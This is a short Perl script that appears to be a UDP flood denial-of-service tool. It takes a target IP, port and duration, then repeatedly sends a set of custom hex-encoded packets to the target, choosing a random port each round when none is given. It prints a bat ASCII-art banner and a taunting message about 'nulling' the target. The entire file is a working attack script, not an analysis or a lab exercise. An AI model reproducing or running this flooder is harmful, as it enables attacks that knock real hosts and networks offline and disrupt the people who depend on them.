#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
	
use Socket;
use strict;

my ($ip,$port,$time) = @ARGV;

my ($iaddr,$endtime,$pport);
my @packets = (
    "fd01ff73412cef548b2b0000000000",
    "ff73412cef548b2b000000000000",
    "ff73412cefcd8b2b003c000000",
    "ff73412cef458c2b000000000000",
    "ff73412cef2f8c2b0031000000",
    "ff73412cef918c2b000000000000",
    "fd02",
);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;

MMMMMMMMMMMMMMMMMMMMM                              MMMMMMMMMMMMMMMMMMMMM
 `MMMMMMMMMMMMMMMMMMMM           N    N           MMMMMMMMMMMMMMMMMMMM'
   `MMMMMMMMMMMMMMMMMMM          MMMMMM          MMMMMMMMMMMMMMMMMMM'  
     MMMMMMMMMMMMMMMMMMM-_______MMMMMMMM_______-MMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
     .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.    
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
                   `MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'                
                          `MMMMMMMMMMMMMMMMMM'                    
                              `MMMMMMMMMM'                              
                                 MMMMMM                         
                                  MMMM                                  
                                   MM                                  


EOTEXT

print "MemeCFW and The Bat Dropped Yo Shit $ip " . ($port ? $port : "Random") . " Port With Custom Packets" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Stop NULLING With Ctrl-C\n" unless $time;

my @binary_packets = map { pack("H*", $_) } @packets;

for (;time() <= $endtime;) {
  $pport = $port ? $port : int(rand(65500))+1;
  
  foreach my $packet (@binary_packets) {
    send(flood, $packet, 0, pack_sockaddr_in($pport, $iaddr));
  }

}

